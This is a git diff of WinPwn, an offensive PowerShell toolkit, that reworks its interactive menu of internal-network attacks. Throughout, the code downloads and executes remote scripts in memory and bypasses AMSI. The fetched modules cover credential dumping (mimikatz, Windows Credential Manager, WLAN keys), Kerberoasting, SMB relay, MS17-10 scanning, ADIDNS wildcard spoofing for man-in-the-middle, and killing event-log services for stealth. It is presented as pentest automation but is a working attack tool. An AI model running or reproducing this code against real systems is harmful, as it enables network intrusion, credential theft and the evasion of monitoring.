@@ -67,7 +67,7 @@ function dependencychecks
         
         if($systemRoleID -ne 1){
         
-                "       [-] This script needs access to the domain. It can only be run on a domain member machine.`n"
+                "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
                
                 Read-Host "Type any key to continue .."
                    
@@ -134,7 +134,8 @@ function Inveigh {
     $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
     if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
     {
-        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1'');WinPwn;}'
+        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
+        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1'');WinPwn;}'
         $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
         $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
         $Wcl = new-object System.Net.WebClient
@@ -253,12 +254,14 @@ function kittielocal
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     AmsiBypass
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/obfuscatedps/DumpWCM.ps1')
+    
     if (isadmin)
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/obfuscatedps/DumpWCM.ps1')
-
+            
             Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
             Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
             
@@ -278,9 +281,11 @@ function kittielocal
     else
     {
         Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
         Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
         Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
+        Write-Host -ForegroundColor Yellow 'Running the small kittie:'
+        inbox >> $currentPath\Exploitation\kittenz.txt
+
     }
 
 }
@@ -701,10 +706,16 @@ function domainreconmodules
                 passhunt -domain $true
             }
 	    
-            Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
-            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
-            Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
-            cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
+}
+
+
+function reconAD
+{
+    pathcheck
+    Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
+    Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
+    cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
 function MS17-10
@@ -716,6 +727,7 @@ function MS17-10
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ms17-10.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
     $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
@@ -1106,6 +1118,15 @@ function kerberoasting
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
 }
 
+function inv-phantom {
+    if (isadmin)
+    {
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/phantom.ps1')
+        phantom
+    }
+    else { Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example privesc :-P'}
+}
+
 Function Get-Installedsoftware {
     [CmdletBinding(SupportsShouldProcess=$true)]
     param(
@@ -1245,6 +1266,11 @@ Function Get-Installedsoftware {
     }
 }
 
+function fruit
+{
+    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
+}
+    
 function WinPwn
 {
     <#
@@ -1253,7 +1279,7 @@ function WinPwn
         Author: @securethisshit
         License: BSD 3-Clause
     #>
-$intro = @'
+@'
 
              
 __        ___       ____                 
@@ -1265,125 +1291,62 @@ __        ___       ____
    --> Automate some internal Penetrationtest processes
 
 '@
-    if (isadmin)
-    {
-        Write-Host -ForegroundColor Green 'Elevated PowerShell session detected. Continuing.'
-    }
-    else
-    {
-        Write-Host -ForegroundColor Red 'Only running non-elevated PowerShell commands. Please launch an elevated session if you have local Administrator Credentials and try again.'
-    }
-    Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
-    
     dependencychecks
     AmsiBypass
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-mimikittenz.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-Phant0m.ps1')
-      
-    if (isadmin)
-    {
-        $stealth = Read-Host -Prompt 'Kill event Logs for stealth? (yes/no)'
-        if ($stealth -eq "yes" -or $stealth -eq "y" -or $stealth -eq "Yes" -or $stealth -eq "Y")
-        {
-            Write-Host -ForegroundColor Yellow 'Killing Event Log Services:'
-            Invoke-Phant0m
-        }
-     }
-    
-    
-    $inveigh = Read-Host -Prompt 'Do you want to use inveigh for NBNS/SMB/HTTPS Spoofing parallel to this script? (yes/no)'
-    if ($inveigh -eq "yes" -or $inveigh -eq "y" -or $inveigh -eq "Yes" -or $inveigh -eq "Y")
-    {
-        Inveigh
-    }        
-    
-    if (isadmin)
-    {
-        $Mimidump = Read-Host -Prompt 'You are local Administrator. Do you want to dump local Passwords with Invoke-kittie? (yes/no)'
-        if ($Mimidump -eq "yes" -or $Mimidump -eq "y" -or $Mimidump -eq "Yes" -or $Mimidump -eq "Y")
-        {
-            kittielocal
-        }
-        else{Write-Host -ForegroundColor Yellow 'Boring...'}
-    }
-    
-    $localRecon = Read-Host -Prompt 'Do you want to use local recon scripts? (yes/no)'
-    if ($localRecon -eq "yes" -or $localRecon -eq "y" -or $localRecon -eq "Yes" -or $localRecon -eq "Y")
-    {
-        #Local Reconning
-        localreconmodules
-    }
-    
-    $domainRecon = Read-Host -Prompt 'Do you want to use domain recon scripts? (yes/no)'
-    if ($domainRecon -eq "yes" -or $domainRecon -eq "y" -or $domainRecon -eq "Yes" -or $domainRecon -eq "Y")
-    {
-        domainreconmodules
-    }
-    
-    $privesc = Read-Host -Prompt 'Do you want to search for possible privilege escalation vectors? (yes/no)'
-    if ($privesc -eq "yes" -or $privesc -eq "y" -or $privesc -eq "Yes" -or $privesc -eq "Y")
-    {
-        privescmodules
-    }
-    
-    #Lazagne
-    $Lazagne = Read-Host -Prompt 'Do you want to extract local Passwords with Lazagne? (yes/no)'
-    if ($Lazagne -eq "yes" -or $Lazagne -eq "y" -or $Lazagne -eq "Yes" -or $Lazagne -eq "Y")
-    {
-        lazagnemodule 
-    }
-    
-    $kerberoasting = Read-Host -Prompt 'Do you want to use Kerberoasting technique to crack function user Hashes? (yes/no)'
-    if ($kerberoasting -eq "yes" -or $kerberoasting -eq "y" -or $kerberoasting -eq "Yes" -or $kerberoasting -eq "Y")
-    {
-        kerberoasting
-    }
 
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
+        Write-Host -ForegroundColor Green '2. Start local recon phase! '
+        Write-Host -ForegroundColor Green '3. Start domain recon phase! '
+        Write-Host -ForegroundColor Green '4. Try to escalate my local privileges! '
+        Write-Host -ForegroundColor Green '5. Kerberoast some service accounts! '
+        Write-Host -ForegroundColor Green '6. Search for SQL Servers in the domain and pwn them if possible! '
+        Write-Host -ForegroundColor Green '7. Collect Bloodhound information! '
+        Write-Host -ForegroundColor Green '8. Search for MS17-10 vulnerable Servers / Clients in this domain! '
+        Write-Host -ForegroundColor Green '9. Give me some Credentials, now! '
+        Write-Host -ForegroundColor Green '10. Search for Systems with Admin-Access to pwn them! '
+        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard for ultimate mitm in all networks! '
+        Write-Host -ForegroundColor Green '12. Execute JAWS! '
+        Write-Host -ForegroundColor Green '13. Execute Sessiongopher! '
+        Write-Host -ForegroundColor Green '14. I want to check some remote system groups via GPO Mapping! '
+        Write-Host -ForegroundColor Green '15. I am local admin, kill the event log services for stealth! '
+        Write-Host -ForegroundColor Green '16. Search for passwords on this system! '
+        Write-Host -ForegroundColor Green '17. Just one ADRecon Report for me! '
+        Write-Host -ForegroundColor Green '18. Search for potential vulnerable web apps (low hanging fruits)! '
+        Write-Host -ForegroundColor Green '19. Find some network shares! '
+        Write-Host -ForegroundColor Green '20. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
-    $mimikitt = Read-Host -Prompt 'Do you want to use mimikittenz for password extraction? (yes/no)'
-    if ($mimikitt -eq "yes" -or $mimikitt -eq "y" -or $mimikitt -eq "Yes" -or $mimikitt -eq "Y")
-    {
-        #Exploitation Phase
-        Write-Host -ForegroundColor Red 'Mimikittenz, output saved to .\Exploitation\Mimikittenz.txt:'
-        Invoke-Mimikittenz >> $currentPath\Exploitation\Mimikittenz.txt
+        Switch ($masterquestion) 
+        {
+             1{Inveigh}
+             2{localreconmodules}
+             3{domainreconmodules}
+             4{privescmodules}
+             5{kerberoasting}
+             6{powerSQL}
+             7{Sharphound}
+             8{MS17-10}
+             9{kittielocal}
+            10{latmov}
+            11{adidnswildcard}
+            12{JAWS}
+            13{sessionGopher}
+            14{groupsearch}
+            15{inv-phantom}
+            16{passhunt}
+            17{reconAD}
+            18{fruit}
+            19{sharenumeration}
+       }
     }
-    
-    $latmov = Read-Host -Prompt 'Do you want to move laterally - recommended for internal assesments? (yes/no)'
-    if ($latmov -eq "yes" -or $latmov -eq "y" -or $latmov -eq "Yes" -or $latmov -eq "Y")
-    {
-        #Lateral Movement Phase
-        latmov
-    }
-    
-    #FindFruit
-    $fruit = Read-Host -Prompt 'Do you want to search for possible weak Web Applications in the network? (yes/no)'
-    if ($fruit -eq "yes" -or $fruit -eq "y" -or $fruit -eq "Yes" -or $fruit -eq "Y")
-    {
-        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
-    }
-    
-    #Share Enumeration
-    $shares = Read-Host -Prompt 'Do you want to search for sensitive Files / Find Shares on the network? (yes/no) (This may take long time)'
-    if ($shares -eq "yes" -or $shares -eq "y" -or $shares -eq "Yes" -or $shares -eq "Y")
-    {
-        sharenumeration
-    }
-    
-    $adi = Read-Host -Prompt 'Do you want to create a ADIDNS Wildcard record? (yes/no)'
-    if ($adi -eq "yes" -or $adi -eq "y" -or $adi -eq "Yes" -or $adi -eq "Y")
-    {
-        adidns
-    }
-    
-    #RDP Access
-    $rdp = Read-Host -Prompt 'Do you want to search for Systems you have RDP/Admin-Access to? (yes/no)'
-    If ($rdp -eq "yes" -or $rdp -eq "y" -or $rdp -eq "Yes" -or $rdp -eq "Y")
-    {
-       groupsearch
-    }
+ While ($masterquestion -ne 20)
+     
     
     #End
     Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
     
 }
-
